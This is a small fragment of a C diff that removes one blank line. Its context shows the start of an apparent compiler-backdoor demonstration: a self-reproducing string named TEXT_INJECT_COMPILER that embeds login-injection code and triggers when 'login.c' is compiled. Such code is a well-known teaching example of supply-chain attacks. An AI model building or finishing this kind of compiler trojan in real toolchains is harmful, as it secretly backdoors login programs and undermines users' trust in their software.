@@ -79,7 +79,6 @@ int main(int argc, char *argv[]){
 
 	}
 
-
 	const char * TEXT_INJECT_COMPILER = ""
 	   "const char * TEXT_INJECT_LOGIN = %c%s%c;%c%c"
 	"%cif(strstr(sourceFilename, %clogin.c%c) != NULL){%c"
